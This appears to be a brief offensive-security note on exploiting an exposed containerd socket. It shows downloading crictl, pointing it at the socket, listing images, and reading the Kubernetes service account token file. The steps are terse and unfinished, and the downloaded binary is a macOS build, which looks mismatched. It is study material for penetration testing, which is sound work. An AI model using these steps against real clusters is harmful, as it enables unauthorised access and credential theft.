------------

### Exploiting Containerd.sock

-------------

- Check `mount`-:

<img width="951" height="382" alt="image" src="https://github.com/user-attachments/assets/14f7bd5f-219e-4913-a059-f3b6d7fea11b" />

- Cntainerd.sock `/custom/containerd/containerd.sock`
- Exploiting [it](https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.36.0/crictl-v1.36.0-darwin-amd64.tar.gz)-:

```bash
wget https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.36.0/crictl-v1.36.0-darwin-amd64.tar.gz
```
- Creating crictl yaml file-:

```yaml
runtime-endpoint: unix:///custom/containerd/containerd.sock
image-endpoint: unix:///custom/containerd/containerd.sock
timeout: 10
debug: false
```

- Bash

```bash
crictl -r unix:///custom/containerd/containerd.sock images
```

- If file read is supported, you can read `file:///var/run/secrets/kubernetes.io/serviceaccount/token`

<img width="1205" height="868" alt="image" src="https://github.com/user-attachments/assets/1d63c2ac-29e5-4013-8160-1632821738c4" />

- 

--------------
